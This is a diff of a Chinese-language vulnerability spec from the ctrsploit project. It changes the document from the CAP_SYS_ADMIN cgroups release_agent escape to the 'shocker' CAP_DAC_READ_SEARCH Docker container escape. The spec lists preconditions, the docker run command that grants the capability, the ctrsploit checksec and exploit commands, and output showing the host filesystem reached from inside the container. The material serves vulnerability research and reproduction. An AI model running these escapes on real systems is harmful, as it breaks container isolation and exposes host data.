@@ -9,9 +9,9 @@ changelog:
 
 ---
 
-# docker CAP_SYS_ADMIN cgroups v1 release agent 逃逸 
+# docker CAP_DAC_READ_SEARCH(shocker) 逃逸
 
-[edit](https://github.com/ctrsploit/sploit-spec/edit/main/vul/sys_admin/README.md)
+[edit](https://github.com/ctrsploit/sploit-spec/edit/main/vul/shocker/README.md)
 
 ## 1. 漏洞介绍
 
@@ -23,15 +23,11 @@ TODO
 
 ## 3. 前提条件
 
-1. 拥有cap_sys_admin
-2. 容器内root
-3. cgroups版本为v1
-4. cgroups拥有top level subsystem
-5. 允许执行mount系统调用
+1. 拥有cap_dac_read_search
 
 ## 4. 漏洞存在性检查
 
-`ctrsploit checksec cap_sys_admin`
+`ctrsploit checksec shocker`
 
 ## 5. 漏洞复现
 
@@ -103,19 +99,28 @@ WARNING: No swap limit support
 启动存在不安全配置的容器。
 
 ```
-root@ubuntu:~# docker run -ti --name poc --cap-add CAP_SYS_ADMIN --security-opt apparmor=unconfined ubuntu
+root@ubuntu:~# docker run -ti --name poc --cap-add CAP_DAC_READ_SEARCH ubuntu
 ```
 
 下载 ctrsploit 步骤略，在容器内发起逃逸攻击。
 
 ```
-root@e33b98bef3c3:/# ctrsploit --colorful checksec sys_admin
-✔  cap_sys_admin	# Container can be escaped when has cap_sys_admin and use cgroups v1
+root@e33b98bef3c3:/# ctrsploit --colorful checksec shocker
+✔  shocker      # Container escape with CAP_DAC_READ_SEARCH, alias shocker, found by Sebastian Krahmer (stealth) in 2014.
 
-root@e33b98bef3c3:/# ctrsploit exploit ra -c "cat /etc/hostname"
-INFO[0000] Execute command: cat /etc/hostname           
-INFO[0001] 
-===========start of result==============
-ubuntu
-===========end of result==============
+root@e33b98bef3c3:/# ./ctrsploit/bin/release/ctrsploit_linux_amd64 exploit shocker
+root@8fe1576e6aef:/proc/self/fd/7# ls -lah
+ls: cannot access '..': No such file or directory
+total 18M
+drwxr-xr-x  20 root root 4.0K Mar 25 03:59 .
+d?????????   ? ?    ?       ?            ? ..
+drwx------   2 root root 4.0K Dec 20 07:38 .cache
+lrwxrwxrwx   1 root root    7 Dec 20 07:29 bin -> usr/bin
+drwxr-xr-x   4 root root 4.0K Jan 16 07:17 boot
+drwxr-xr-x   4 root root 4.0K Dec 20 07:29 dev
+drwxr-xr-x 198 root root  12K Jun  7 01:52 etc
+drwxr-xr-x   3 root root 4.0K Dec 20 07:41 home
+lrwxrwxrwx   1 root root   33 Dec 20 07:29 initrd.img -> boot/initrd.img-6.5.0-kali3-amd64
+lrwxrwxrwx   1 root root   33 Dec 20 07:29 initrd.img.old -> boot/initrd.img-6.5.0-kali3-amd64
+...
 ```
